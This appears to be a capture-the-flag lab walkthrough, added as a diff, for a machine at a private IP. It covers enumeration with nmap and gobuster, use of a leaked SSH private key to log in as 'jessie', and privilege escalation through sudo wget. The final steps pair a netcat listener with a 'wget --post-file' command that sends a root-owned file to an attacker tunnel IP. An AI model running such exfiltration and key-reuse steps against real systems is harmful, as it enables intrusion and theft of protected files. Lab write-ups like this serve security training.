@@ -1,0 +1,14 @@
+1- Scan the ports by nmap
+2- Search the sub directories by gobuster (find http://10.82.187.93/sitemap/)
+3- Search the subdirectories of http://10.82.187.93/sitemap/ -->find .ssh file that contian rsa private key
+4- save the private key in a file and make this command: chmod 600 filename
+5- Check the website and its comments as code (found the usernmae:jessie)
+
+Enter the machine
+6- command: ssh 10.82.187.93 -l jessie -i id_rsa
+7- cd Documents --> find user_flag.txt
+
+Privlege Esclation
+8- nc -lvnp 4445 (in another temainal)
+9- sudo /usr/bin/wget --post-file=/root/root_flag.txt http://<Tunnel IP>:4445 (find the flag on the temainal)
+
